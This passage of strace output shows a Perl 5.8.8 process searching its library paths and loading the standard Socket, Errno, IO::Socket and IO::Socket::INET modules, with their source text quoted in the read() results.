IO::Select;\n\n\tmy $sel = new IO::Select $sock;\n\n\tunless ($sel->can_read($timeout)) {\n\t    $@ = \'accept: timeout\';\n\t    $! = (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t    return;\n\t}\n", 4096) = 4096
12318 07:41:50.116100 stat64("/etc/perl/Socket.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.116116 stat64("/etc/perl/Socket.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.116130 stat64("/usr/local/lib/perl/5.8.8/Socket.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.116143 stat64("/usr/local/lib/perl/5.8.8/Socket.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.116157 stat64("/usr/local/share/perl/5.8.8/Socket.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.116170 stat64("/usr/local/share/perl/5.8.8/Socket.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.116184 stat64("/usr/lib/perl5/Socket.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.116196 stat64("/usr/lib/perl5/Socket.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.116209 stat64("/usr/share/perl5/Socket.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.116221 stat64("/usr/share/perl5/Socket.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.116234 stat64("/usr/lib/perl/5.8/Socket.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.116247 stat64("/usr/lib/perl/5.8/Socket.pm", {st_mode=S_IFREG|0644, st_size=3514, ...}) = 0
12318 07:41:50.116268 open("/usr/lib/perl/5.8/Socket.pm", O_RDONLY|O_LARGEFILE) = 8
12318 07:41:50.116282 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff54d18) = -1 ENOTTY (Inappropriate ioctl for device)
12318 07:41:50.116293 _llseek(8, 0, [0], SEEK_CUR) = 0
12318 07:41:50.116310 read(8, "package Socket;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n$VERSION = \"1.78\";\n\nuse Carp;\nuse warnings::register;\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n@EXPORT = qw(\n\tinet_aton inet_ntoa\n\tsockaddr_family\n\tpack_sockaddr_in unpack_sockaddr_in\n\tpack_sockaddr_un unpack_sockaddr_un\n\tsockaddr_in sockaddr_un\n\tINADDR_ANY INADDR_BROADCAST INADDR_LOOPBACK INADDR_NONE\n\tAF_802\n\tAF_AAL\n\tAF_APPLETALK\n\tAF_CCITT\n\tAF_CHAOS\n\tAF_CTF\n\tAF_DATAKIT\n\tAF_DECnet\n\tAF_DLI\n\tAF_ECMA\n\tAF_GOSIP\n\tAF_HYLINK\n\tAF_IMPLINK\n\tAF_INET\n\tAF_INET6\n\tAF_ISO\n\tAF_KEY\n\tAF_LAST\n\tAF_LAT\n\tAF_LINK\n\tAF_MAX\n\tAF_NBS\n\tAF_NIT\n\tAF_NS\n\tAF_OSI\n\tAF_OSINET\n\tAF_PUP\n\tAF_ROUTE\n\tAF_SNA\n\tAF_UNIX\n\tAF_UNSPEC\n\tAF_USER\n\tAF_WAN\n\tAF_X25\n\tIOV_MAX\n\tMSG_BCAST\n\tMSG_BTAG\n\tMSG_CTLFLAGS\n\tMSG_CTLIGNORE\n\tMSG_CTRUNC\n\tMSG_DONTROUTE\n\tMSG_DONTWAIT\n\tMSG_EOF\n\tMSG_EOR\n\tMSG_ERRQUEUE\n\tMSG_ETAG\n\tMSG_FIN\n\tMSG_MAXIOVLEN\n\tMSG_MCAST\n\tMSG_NOSIGNAL\n\tMSG_OOB\n\tMSG_PEEK\n\tMSG_PROXY\n\tMSG_RST\n\tMSG_SYN\n\tMSG_TRUNC\n\tMSG_URG\n\tMSG_WAITALL\n\tMSG_WIRE\n\tPF_802\n\tPF_AAL\n\tPF_APPLETALK\n\tPF_CCITT\n\tPF_CHAOS\n\tPF_CTF\n\tPF_DATAKIT\n\tPF_DECnet\n\tPF_DLI\n\tPF_ECMA\n\tPF_GOSIP\n\tPF_HYLINK\n\tPF_IMPLINK\n\tPF_INET\n\tPF_INET6\n\tPF_ISO\n\tPF_KEY\n\tPF_LAST\n\tPF_LAT\n\tPF_LINK\n\tPF_MAX\n\tPF_NBS\n\tPF_NIT\n\tPF_NS\n\tPF_OSI\n\tPF_OSINET\n\tPF_PUP\n\tPF_ROUTE\n\tPF_SNA\n\tPF_UNIX\n\tPF_UNSPEC\n\tPF_USER\n\tPF_WAN\n\tPF_X25\n\tSCM_CONNECT\n\tSCM_CREDENTIALS\n\tSCM_CREDS\n\tSCM_RIGHTS\n\tSCM_TIMESTAMP\n\tSHUT_RD\n\tSHUT_RDWR\n\tSHUT_WR\n\tSOCK_DGRAM\n\tSOCK_RAW\n\tSOCK_RDM\n\tSOCK_SEQPACKET\n\tSOCK_STREAM\n\tSOL_SOCKET\n\tSOMAXCONN\n\tSO_ACCEPTCONN\n\tSO_ATTACH_FILTER\n\tSO_BACKLOG\n\tSO_BROADCAST\n\tSO_CHAMELEON\n\tSO_DEBUG\n\tSO_DETACH_FILTER\n\tSO_DGRAM_ERRIND\n\tSO_DONTLINGER\n\tSO_DONTROUTE\n\tSO_ERROR\n\tSO_FAMILY\n\tSO_KEEPALIVE\n\tSO_LINGER\n\tSO_OOBINLINE\n\tSO_PASSCRED\n\tSO_PASSIFNAME\n\tSO_PEERCRED\n\tSO_PROTOCOL\n\tSO_PROTOTYPE\n\tSO_RCVBUF\n\tSO_RCVLOWAT\n\tSO_RCVTIMEO\n\tSO_REUSEADDR\n\tSO_REUSEPORT\n\tSO_SECURITY_AUTHENTICATION\n\tSO_SECURITY_ENCRYPTION_NETWORK\n\tSO_SECURITY_ENCRYPTION_TRANSPORT\n\tSO_SNDBUF\n\tSO_SNDLOWAT\n\tSO_SNDTIMEO\n\tSO_STATE\n\tSO_TYPE\n\tSO_USELOOPBACK\n\tSO_XOPEN\n\tSO_XSE\n\tUIO_MAXIOV\n);\n\n@EXPORT_OK = qw(CR LF CRLF $CR $LF $CRLF\n\n\t       IPPROTO_TCP\n\t       TCP_KEEPALIVE\n\t       TCP_MAXRT\n\t       TCP_MAXSEG\n\t       TCP_NODELAY\n\t       TCP_STDURG);\n\n%EXPORT_TAGS = (\n    crlf    => [qw(CR LF CRLF $CR $LF $CRLF)],\n    all     => [@EXPORT, @EXPORT_OK],\n);\n\nBEGIN {\n    sub CR   () {\"\\015\"}\n    sub LF   () {\"\\012\"}\n    sub CRLF () {\"\\015\\012\"}\n}\n\n*CR   = \\CR();\n*LF   = \\LF();\n*CRLF = \\CRLF();\n\nsub sockaddr_in {\n    if (@_ == 6 && !wantarray) { # perl5.001m compat; use this && die\n\tmy($af, $port, @quad) = @_;\n\twarnings::warn \"6-ARG sockaddr_in call is deprecated\" \n\t    if warnings::enabled();\n\tpack_sockaddr_in($port, inet_aton(join(\'.\', @quad)));\n    } elsif (wantarray) {\n\tcroak \"usage:   (port,iaddr) = sockaddr_in(sin_sv)\" unless @_ == 1;\n        unpack_sockaddr_in(@_);\n    } else {\n\tcroak \"usage:   sin_sv = sockaddr_in(port,iaddr))\" unless @_ == 2;\n        pack_sockaddr_in(@_);\n    }\n}\n\nsub sockaddr_un {\n    if (wantarray) {\n\tcroak \"usage:   (filename) = sockaddr_un(sun_sv)\" unless @_ == 1;\n        unpack_sockaddr_un(@_);\n    } else {\n\tcroak \"usage:   sun_sv = sockaddr_un(filename)\" unless @_ == 1;\n        pack_sockaddr_un(@_);\n    }\n}\n\nsub AUTOLOAD {\n    my($constname);\n    ($constname = $AUTOLOAD) =~ s/.*:://;\n    croak \"&Socket::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n\tcroak $error;\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Socket\', $VERSION;\n\n1;\n", 4096) = 3514
12318 07:41:50.116712 brk(0x8239000)    = 0x8239000
12318 07:41:50.116921 read(8, "", 4096) = 0
12318 07:41:50.116936 close(8)          = 0
12318 07:41:50.117035 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.so", {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
12318 07:41:50.117061 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
12318 07:41:50.117088 open("/usr/lib/perl/5.8/auto/Socket/Socket.so", O_RDONLY) = 8
12318 07:41:50.117103 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\360\16\0\0004\0\0\0\34I\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\264F\0\0\264F\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264F\0\0\264V\0\0\264V\0\0\274\1\0\0\300\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\310F\0\0\310V\0\0\310V\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0%\0\0\0008\0\0\0\0\0\0\0\10\0\0\0\22\0\0\0\35\0\0\0\0\0\0\0)\0\0\0\0\0\0\0\0\0\0\0\7\0\0\0\37\0\0\0\0\0\0\0\0\0\0\0007\0\0\0$\0\0\0-\0\0\0(\0\0\0\36\0\0\0\n\0\0\0,\0\0\0001\0\0\0 \0\0\0\0\0\0\0000\0\0\0\0\0\0\0005\0\0\0!\0\0\0\0\0\0\0\30\0\0\0002\0\0\0\27\0\0\0\'\0\0\0+\0\0\0\f\0\0\0\0\0\0\0.\0\0\0/\0\0\0&\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0*\0\0\0\0\0\0\0\t\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4\0\0\0\17\0\0\0\0\0\0\0\6\0\0\0\20\0\0\0\0\0\0\0\21\0\0\0\24\0\0\0\26\0\0\0\0\0\0\0\23\0\0\0\0\0\0\0\25\0\0\0\0\0\0\0\0\0\0\0\r\0\0\0\0\0\0\0\31\0\0\0003\0\0\0\0\0\0\0\34\0\0\0\0\0\0\0\0\0\0\0%\0\0\0#\0\0\0\5\0\0\0004\0\0\0\0\0\0\0\33\0\0\0", 512) = 512
12318 07:41:50.117198 fstat64(8, {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
12318 07:41:50.117217 mmap2(NULL, 22644, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7d4c000
12318 07:41:50.117231 mmap2(0xb7d51000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x4) = 0xb7d51000
12318 07:41:50.117246 close(8)          = 0
12318 07:41:50.117871 brk(0x825a000)    = 0x825a000
12318 07:41:50.118062 stat64("/etc/perl/Errno.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.118080 stat64("/etc/perl/Errno.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.118094 stat64("/usr/local/lib/perl/5.8.8/Errno.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.118106 stat64("/usr/local/lib/perl/5.8.8/Errno.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.118120 stat64("/usr/local/share/perl/5.8.8/Errno.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.118133 stat64("/usr/local/share/perl/5.8.8/Errno.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.118147 stat64("/usr/lib/perl5/Errno.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.118158 stat64("/usr/lib/perl5/Errno.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.118171 stat64("/usr/share/perl5/Errno.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.118183 stat64("/usr/share/perl5/Errno.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.118196 stat64("/usr/lib/perl/5.8/Errno.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.118208 stat64("/usr/lib/perl/5.8/Errno.pm", {st_mode=S_IFREG|0644, st_size=5967, ...}) = 0
12318 07:41:50.118228 open("/usr/lib/perl/5.8/Errno.pm", O_RDONLY|O_LARGEFILE) = 8
12318 07:41:50.118242 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff54d18) = -1 ENOTTY (Inappropriate ioctl for device)
12318 07:41:50.118254 _llseek(8, 0, [0], SEEK_CUR) = 0
12318 07:41:50.118273 read(8, "#\n# This file is auto-generated. ***ANY*** changes here will be lost\n#\n\npackage Errno;\nour (@EXPORT_OK,%EXPORT_TAGS,@ISA,$VERSION,%errno,$AUTOLOAD);\nuse Exporter ();\nuse strict;\n\n$VERSION = \"1.09_01\";\n$VERSION = eval $VERSION;\n@ISA = qw(Exporter);\n\n@EXPORT_OK = qw(EBADR ENOMSG ENOTSUP ESTRPIPE EADDRINUSE EL3HLT EBADF\n\tENOTBLK ENAVAIL ECHRNG ENOTNAM ELNRNG ENOKEY EXDEV EBADE EBADSLT\n\tECONNREFUSED ENOSTR ENONET EOVERFLOW EISCONN EFBIG EKEYREVOKED\n\tECONNRESET EWOULDBLOCK ELIBMAX EREMOTEIO ENOPKG ELIBSCN EDESTADDRREQ\n\tENOTSOCK EIO EMEDIUMTYPE EINPROGRESS ERANGE EAFNOSUPPORT EADDRNOTAVAIL\n\tEINTR EREMOTE EILSEQ ENOMEM EPIPE ENETUNREACH ENODATA EUSERS\n\tEOPNOTSUPP EPROTO EISNAM ESPIPE EALREADY ENAMETOOLONG ENOEXEC EISDIR\n\tEBADRQC EEXIST EDOTDOT ELIBBAD EOWNERDEAD ESRCH EFAULT EXFULL\n\tEDEADLOCK EAGAIN ENOPROTOOPT ENETDOWN EPROTOTYPE EL2NSYNC ENETRESET\n\tEUCLEAN EADV EROFS ESHUTDOWN EMULTIHOP EPROTONOSUPPORT ENFILE ENOLCK\n\tECONNABORTED ECANCELED EDEADLK ESRMNT ENOLINK ETIME ENOTDIR EINVAL\n\tENOTTY ENOANO ELOOP ENOENT EPFNOSUPPORT EBADMSG ENOMEDIUM EL2HLT EDOM\n\tEBFONT EKEYEXPIRED EMSGSIZE ENOCSI EL3RST ENOSPC EIDRM ENOBUFS ENOSYS\n\tEHOSTDOWN EBADFD ENOSR ENOTCONN ESTALE EDQUOT EKEYREJECTED EMFILE\n\tENOTRECOVERABLE EACCES EBUSY E2BIG EPERM ELIBEXEC ETOOMANYREFS ELIBACC\n\tENOTUNIQ ECOMM ERESTART ESOCKTNOSUPPORT EUNATCH ETIMEDOUT ENXIO ENODEV\n\tETXTBSY EMLINK ECHILD EHOSTUNREACH EREMCHG ENOTEMPTY);\n\t\n%EXPORT_TAGS = (\n    POSIX => [qw(\n\tE2BIG EACCES EADDRINUSE EADDRNOTAVAIL EAFNOSUPPORT EAGAIN EALREADY\n\tEBADF EBUSY ECHILD ECONNABORTED ECONNREFUSED ECONNRESET EDEADLK\n\tEDESTADDRREQ EDOM EDQUOT EEXIST EFAULT EFBIG EHOSTDOWN EHOSTUNREACH\n\tEINPROGRESS EINTR EINVAL EIO EISCONN EISDIR ELOOP EMFILE EMLINK\n\tEMSGSIZE ENAMETOOLONG ENETDOWN ENETRESET ENETUNREACH ENFILE ENOBUFS\n\tENODEV ENOENT ENOEXEC ENOLCK ENOMEM ENOPROTOOPT ENOSPC ENOSYS ENOTBLK\n\tENOTCONN ENOTDIR ENOTEMPTY ENOTSOCK ENOTTY ENXIO EOPNOTSUPP EPERM\n\tEPFNOSUPPORT EPIPE EPROTONOSUPPORT EPROTOTYPE ERANGE EREMOTE ERESTART\n\tEROFS ESHUTDOWN ESOCKTNOSUPPORT ESPIPE ESRCH ESTALE ETIMEDOUT\n\tETOOMANYREFS ETXTBSY EUSERS EWOULDBLOCK EXDEV\n    )]\n);\n\nsub EPERM () { 1 }\nsub ENOENT () { 2 }\nsub ESRCH () { 3 }\nsub EINTR () { 4 }\nsub EIO () { 5 }\nsub ENXIO () { 6 }\nsub E2BIG () { 7 }\nsub ENOEXEC () { 8 }\nsub EBADF () { 9 }\nsub ECHILD () { 10 }\nsub EWOULDBLOCK () { 11 }\nsub EAGAIN () { 11 }\nsub ENOMEM () { 12 }\nsub EACCES () { 13 }\nsub EFAULT () { 14 }\nsub ENOTBLK () { 15 }\nsub EBUSY () { 16 }\nsub EEXIST () { 17 }\nsub EXDEV () { 18 }\nsub ENODEV () { 19 }\nsub ENOTDIR () { 20 }\nsub EISDIR () { 21 }\nsub EINVAL () { 22 }\nsub ENFILE () { 23 }\nsub EMFILE () { 24 }\nsub ENOTTY () { 25 }\nsub ETXTBSY () { 26 }\nsub EFBIG () { 27 }\nsub ENOSPC () { 28 }\nsub ESPIPE () { 29 }\nsub EROFS () { 30 }\nsub EMLINK () { 31 }\nsub EPIPE () { 32 }\nsub EDOM () { 33 }\nsub ERANGE () { 34 }\nsub EDEADLOCK () { 35 }\nsub EDEADLK () { 35 }\nsub ENAMETOOLONG () { 36 }\nsub ENOLCK () { 37 }\nsub ENOSYS () { 38 }\nsub ENOTEMPTY () { 39 }\nsub ELOOP () { 40 }\nsub ENOMSG () { 42 }\nsub EIDRM () { 43 }\nsub ECHRNG () { 44 }\nsub EL2NSYNC () { 45 }\nsub EL3HLT () { 46 }\nsub EL3RST () { 47 }\nsub ELNRNG () { 48 }\nsub EUNATCH () { 49 }\nsub ENOCSI () { 50 }\nsub EL2HLT () { 51 }\nsub EBADE () { 52 }\nsub EBADR () { 53 }\nsub EXFULL () { 54 }\nsub ENOANO () { 55 }\nsub EBADRQC () { 56 }\nsub EBADSLT () { 57 }\nsub EBFONT () { 59 }\nsub ENOSTR () { 60 }\nsub ENODATA () { 61 }\nsub ETIME () { 62 }\nsub ENOSR () { 63 }\nsub ENONET () { 64 }\nsub ENOPKG () { 65 }\nsub EREMOTE () { 66 }\nsub ENOLINK () { 67 }\nsub EADV () { 68 }\nsub ESRMNT () { 69 }\nsub ECOMM () { 70 }\nsub EPROTO () { 71 }\nsub EMULTIHOP () { 72 }\nsub EDOTDOT () { 73 }\nsub EBADMSG () { 74 }\nsub EOVERFLOW () { 75 }\nsub ENOTUNIQ () { 76 }\nsub EBADFD () { 77 }\nsub EREMCHG () { 78 }\nsub ELIBACC () { 79 }\nsub ELIBBAD () { 80 }\nsub ELIBSCN () { 81 }\nsub ELIBMAX () { 82 }\nsub ELIBEXEC () { 83 }\nsub EILSEQ () { 84 }\nsub ERESTART () { 85 }\nsub ESTRPIPE () { 86 }\nsub EUSERS () { 87 }\nsub ENOTSOCK () { 88 }\nsub EDESTADDRREQ () { 89 }\nsub EMSGSIZE () { 90 }\nsub EPROTOTYPE () { 91 }\nsub ENOPROTOOPT () { 92 }\nsub EPROTONOSUPPORT () ", 4096) = 4096
12318 07:41:50.119090 read(8, "{ 93 }\nsub ESOCKTNOSUPPORT () { 94 }\nsub ENOTSUP () { 95 }\nsub EOPNOTSUPP () { 95 }\nsub EPFNOSUPPORT () { 96 }\nsub EAFNOSUPPORT () { 97 }\nsub EADDRINUSE () { 98 }\nsub EADDRNOTAVAIL () { 99 }\nsub ENETDOWN () { 100 }\nsub ENETUNREACH () { 101 }\nsub ENETRESET () { 102 }\nsub ECONNABORTED () { 103 }\nsub ECONNRESET () { 104 }\nsub ENOBUFS () { 105 }\nsub EISCONN () { 106 }\nsub ENOTCONN () { 107 }\nsub ESHUTDOWN () { 108 }\nsub ETOOMANYREFS () { 109 }\nsub ETIMEDOUT () { 110 }\nsub ECONNREFUSED () { 111 }\nsub EHOSTDOWN () { 112 }\nsub EHOSTUNREACH () { 113 }\nsub EALREADY () { 114 }\nsub EINPROGRESS () { 115 }\nsub ESTALE () { 116 }\nsub EUCLEAN () { 117 }\nsub ENOTNAM () { 118 }\nsub ENAVAIL () { 119 }\nsub EISNAM () { 120 }\nsub EREMOTEIO () { 121 }\nsub EDQUOT () { 122 }\nsub ENOMEDIUM () { 123 }\nsub EMEDIUMTYPE () { 124 }\nsub ECANCELED () { 125 }\nsub ENOKEY () { 126 }\nsub EKEYEXPIRED () { 127 }\nsub EKEYREVOKED () { 128 }\nsub EKEYREJECTED () { 129 }\nsub EOWNERDEAD () { 130 }\nsub ENOTRECOVERABLE () { 131 }\n\nsub TIEHASH { bless [] }\n\nsub FETCH {\n    my ($self, $errname) = @_;\n    my $proto = prototype(\"Errno::$errname\");\n    my $errno = \"\";\n    if (defined($proto) && $proto eq \"\") {\n\tno strict \'refs\';\n\t$errno = &$errname;\n        $errno = 0 unless $! == $errno;\n    }\n    return $errno;\n}\n\nsub STORE {\n    require Carp;\n    Carp::confess(\"ERRNO hash is read only!\");\n}\n\n*CLEAR = \\&STORE;\n*DELETE = \\&STORE;\n\nsub NEXTKEY {\n    my($k,$v);\n    while(($k,$v) = each %Errno::) {\n\tmy $proto = prototype(\"Errno::$k\");\n\tlast if (defined($proto) && $proto eq \"\");\n    }\n    $k\n}\n\nsub FIRSTKEY {\n    my $s = scalar keys %Errno::;\t# initialize iterator\n    goto &NEXTKEY;\n}\n\nsub EXISTS {\n    my ($self, $errname) = @_;\n    my $r = ref $errname;\n    my $proto = !$r || $r eq \'CODE\' ? prototype($errname) : undef;\n    defined($proto) && $proto eq \"\";\n}\n\ntie %!, __PACKAGE__;\n\n1;\n__END__\n\n", 4096) = 1871
12318 07:41:50.119555 _llseek(8, 5966, [5966], SEEK_SET) = 0
12318 07:41:50.119606 _llseek(8, 0, [5966], SEEK_CUR) = 0
12318 07:41:50.119630 close(8)          = 0
12318 07:41:50.120521 brk(0x827b000)    = 0x827b000
12318 07:41:50.120752 read(6, "    }\n\n    $peer = accept($new,$sock)\n\tor return;\n\n    return wantarray ? ($new, $peer)\n    \t      \t     : $new;\n}\n\nsub sockname {\n    @_ == 1 or croak \'usage: $sock->sockname()\';\n    getsockname($_[0]);\n}\n\nsub peername {\n    @_ == 1 or croak \'usage: $sock->peername()\';\n    my($sock) = @_;\n    getpeername($sock)\n      || ${*$sock}{\'io_socket_peername\'}\n      || undef;\n}\n\nsub connected {\n    @_ == 1 or croak \'usage: $sock->connected()\';\n    my($sock) = @_;\n    getpeername($sock);\n}\n\nsub send {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $sock->send(BUF, [FLAGS, [TO]])\';\n    my $sock  = $_[0];\n    my $flags = $_[2] || 0;\n    my $peer  = $_[3] || $sock->peername;\n\n    croak \'send: Cannot determine peer address\'\n\t unless($peer);\n\n    my $r = defined(getpeername($sock))\n\t? send($sock, $_[1], $flags)\n\t: send($sock, $_[1], $flags, $peer);\n\n    # remember who we send to, if it was successful\n    ${*$sock}{\'io_socket_peername\'} = $peer\n\tif(@_ == 4 && defined $r);\n\n    $r;\n}\n\nsub recv {\n    @_ == 3 || @_ == 4 or croak \'usage: $sock->recv(BUF, LEN [, FLAGS])\';\n    my $sock  = $_[0];\n    my $len   = $_[2];\n    my $flags = $_[3] || 0;\n\n    # remember who we recv\'d from\n    ${*$sock}{\'io_socket_peername\'} = recv($sock, $_[1]=\'\', $len, $flags);\n}\n\nsub shutdown {\n    @_ == 2 or croak \'usage: $sock->shutdown(HOW)\';\n    my($sock, $how) = @_;\n    shutdown($sock, $how);\n}\n\nsub setsockopt {\n    @_ == 4 or croak \'$sock->setsockopt(LEVEL, OPTNAME)\';\n    setsockopt($_[0],$_[1],$_[2],$_[3]);\n}\n\nmy $intsize = length(pack(\"i\",0));\n\nsub getsockopt {\n    @_ == 3 or croak \'$sock->getsockopt(LEVEL, OPTNAME)\';\n    my $r = getsockopt($_[0],$_[1],$_[2]);\n    # Just a guess\n    $r = unpack(\"i\", $r)\n\tif(defined $r && length($r) == $intsize);\n    $r;\n}\n\nsub sockopt {\n    my $sock = shift;\n    @_ == 1 ? $sock->getsockopt(SOL_SOCKET,@_)\n\t    : $sock->setsockopt(SOL_SOCKET,@_);\n}\n\nsub atmark {\n    @_ == 1 or croak \'usage: $sock->atmark()\';\n    my($sock) = @_;\n    sockatmark($sock);\n}\n\nsub timeout {\n    @_ == 1 || @_ == 2 or croak \'usage: $sock->timeout([VALUE])\';\n    my($sock,$val) = @_;\n    my $r = ${*$sock}{\'io_socket_timeout\'};\n\n    ${*$sock}{\'io_socket_timeout\'} = defined $val ? 0 + $val : $val\n\tif(@_ == 2);\n\n    $r;\n}\n\nsub sockdomain {\n    @_ == 1 or croak \'usage: $sock->sockdomain()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_domain\'};\n}\n\nsub socktype {\n    @_ == 1 or croak \'usage: $sock->socktype()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_type\'}\n}\n\nsub protocol {\n    @_ == 1 or croak \'usage: $sock->protocol()\';\n    my($sock) = @_;\n    ${*$sock}{\'io_socket_proto\'};\n}\n\n1;\n\n__END__\n\n", 4096) = 2603
12318 07:41:50.121331 _llseek(6, 6698, [6698], SEEK_SET) = 0
12318 07:41:50.121347 _llseek(6, 0, [6698], SEEK_CUR) = 0
12318 07:41:50.121357 close(6)          = 0
12318 07:41:50.121376 stat64("/etc/perl/IO/Socket/INET.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.121390 stat64("/etc/perl/IO/Socket/INET.pm", 0xbff553bc) = -1 ENOENT (No such file or directory)
12318 07:41:50.121404 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.121421 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pm", 0xbff553bc) = -1 ENOENT (No such file or directory)
12318 07:41:50.121436 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.121449 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pm", 0xbff553bc) = -1 ENOENT (No such file or directory)
12318 07:41:50.121464 stat64("/usr/lib/perl5/IO/Socket/INET.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.121464 stat64("/usr/lib/perl5/IO/Socket/INET.pm", 0xbff553bc) = -1 ENOENT (No such file or directory)
12318 07:41:50.121473 stat64("/usr/share/perl5/IO/Socket/INET.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.121485 stat64("/usr/share/perl5/IO/Socket/INET.pm", 0xbff553bc) = -1 ENOENT (No such file or directory)
12318 07:41:50.121498 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.121512 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pm", {st_mode=S_IFREG|0644, st_size=6497, ...}) = 0
12318 07:41:50.121533 open("/usr/lib/perl/5.8/IO/Socket/INET.pm", O_RDONLY|O_LARGEFILE) = 6
12318 07:41:50.121548 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff551c8) = -1 ENOTTY (Inappropriate ioctl for device)
12318 07:41:50.121560 _llseek(6, 0, [0], SEEK_CUR) = 0
12318 07:41:50.121577 read(6, "# IO::Socket::INET.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::INET;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\nuse Exporter;\nuse Errno;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.29\";\n\nmy $EINVAL = exists(&Errno::EINVAL) ? Errno::EINVAL() : 1;\n\nIO::Socket::INET->register_domain( AF_INET );\n\nmy %socket_type = ( tcp  => SOCK_STREAM,\n\t\t    udp  => SOCK_DGRAM,\n\t\t    icmp => SOCK_RAW\n\t\t  );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"PeerAddr\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub _sock_info {\n  my($addr,$port,$proto) = @_;\n  my $origport = $port;\n  my @proto = ();\n  my @serv = ();\n\n  $port = $1\n\tif(defined $addr && $addr =~ s,:([\\w\\(\\)/]+)$,,);\n\n  if(defined $proto  && $proto =~ /\\D/) {\n    if(@proto = getprotobyname($proto)) {\n      $proto = $proto[2] || undef;\n    }\n    else {\n      $@ = \"Bad protocol \'$proto\'\";\n      return;\n    }\n  }\n\n  if(defined $port) {\n    my $defport = ($port =~ s,\\((\\d+)\\)$,,) ? $1 : undef;\n    my $pnum = ($port =~ m,^(\\d+)$,)[0];\n\n    @serv = getservbyname($port, $proto[0] || \"\")\n\tif ($port =~ m,\\D,);\n\n    $port = $serv[2] || $defport || $pnum;\n    unless (defined $port) {\n\t$@ = \"Bad service \'$origport\'\";\n\treturn;\n    }\n\n    $proto = (getprotobyname($serv[3]))[2] || undef\n\tif @serv && !$proto;\n  }\n\n return ($addr || undef,\n\t $port || undef,\n\t $proto || undef\n\t);\n}\n\nsub _error {\n    my $sock = shift;\n    my $err = shift;\n    {\n      local($!);\n      